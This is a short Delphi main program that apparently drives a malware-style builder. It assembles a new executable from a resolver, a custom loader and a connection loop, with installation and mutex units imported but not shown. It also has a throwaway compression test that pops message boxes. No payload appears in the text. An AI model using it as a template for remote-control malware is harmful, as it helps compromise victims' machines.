program Project1;

uses
  Windows,
  untUtils in 'untUtils.pas',
  untInstallation in 'Functions\untInstallation.pas',
  untLoader in 'Loader\untLoader.pas',
  Sysutils,
  Classes,
  untPE in 'Utils\untPE.pas',
  untConnection in 'Functions\untConnection.pas',
  untMutex in 'Functions\untMutex.pas',
  untCompression in 'Functions\untCompression.pas';

var
  mPE:TPEFile;
procedure lol();
var
  strData:PChar;
  pData:Pointer;
  l,l1:Cardinal;
begin
  strData := 'LLELELK';
  l :=  (Length(strdata) * 2) + 1;
  l1 := l;
  pData := CompressMemory(@strData[0], l);
  MessageBoxW(0,pData,nil,0);
  pData := DecompressMemory(pData, l, l1);
  MessageBoxW(0,pData,nil,0);
end;
procedure BuildSetup();
begin
  mPE := TPEFile.Create;
  mPE.CreatePEBase;

  mPE.AddFunction(@resolver_start, @resolver_end);
  mPE.CustomizeLoader;

  mPE.AddFunction(@ConnectionLoop_CALLER, @ConnectionLoop_END);

  mPE.FixSectionLen();
  mPE.SaveFile('test.exe');
  mPE.Free;
end;

begin
  lol();
   BuildSetup;
end.
